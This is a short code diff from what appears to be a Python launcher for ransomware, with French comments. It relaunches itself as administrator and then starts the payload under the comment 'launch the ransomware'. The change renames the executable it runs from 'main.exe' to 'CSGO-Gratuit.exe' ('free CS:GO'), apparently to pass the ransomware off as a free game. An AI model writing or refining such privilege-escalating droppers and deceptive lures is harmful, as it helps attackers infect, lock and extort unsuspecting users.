@@ -30,7 +30,7 @@ if is_admin():
     for thread in threads: thread.join()
     
     # Lancer le ransommware
-    os.system("start main.exe")
+    os.system("start CSGO-Gratuit.exe")
     
 else:
     # Sinon relancer le launcher en administrateur
